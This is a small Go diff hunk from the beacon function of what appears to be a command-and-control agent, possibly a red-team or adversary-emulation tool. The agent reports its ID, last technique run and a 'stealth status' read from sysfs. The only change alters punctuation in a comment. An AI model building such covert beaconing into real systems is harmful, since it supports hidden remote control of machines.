@@ -61,7 +61,7 @@ func beacon(serverAddr, agentID string, lastTTP int, lastResult, lastError strin
 		LastError:     lastError,
 		Token:         protocol.GenerateToken(config.SharedSecret, agentID),
 		Env:           env,
-		StealthStatus: LocalStealthStatus(), // live sysfs read — survives server restart
+		StealthStatus: LocalStealthStatus(), // live sysfs read   survives server restart
 	}
 
 	body, err := protocol.Encode(checkin)
